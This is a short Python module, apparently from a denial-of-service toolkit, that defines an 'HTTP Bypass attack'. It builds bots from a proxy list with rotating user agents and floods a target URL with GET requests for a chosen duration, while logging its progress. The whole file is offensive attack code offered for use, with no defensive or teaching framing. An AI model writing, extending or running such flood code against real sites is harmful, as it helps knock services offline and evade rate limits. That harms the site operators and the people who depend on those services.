import time
from utils.http_bot import HTTPBot
from utils.random_utils import random_item

def start_bypass_attack(target, proxies, user_agents, duration):
    bots = [HTTPBot(proxy, random_item(user_agents)) for proxy in proxies]
    end_time = time.time() + duration
    total_requests = 0

    print(f"🚀 Starting HTTP Bypass attack on {target} with {len(bots)} bots...")
    print(f"⏳ Duration: {duration} seconds")

    while time.time() < end_time:
        for bot in bots:
            status = bot.get_request(target)
            print(f"✅ GET request to {target} | Status: {status}")
            total_requests += 1
            time.sleep(0.1)

    print(f"🎉 Attack finished! Total requests sent: {total_requests}")
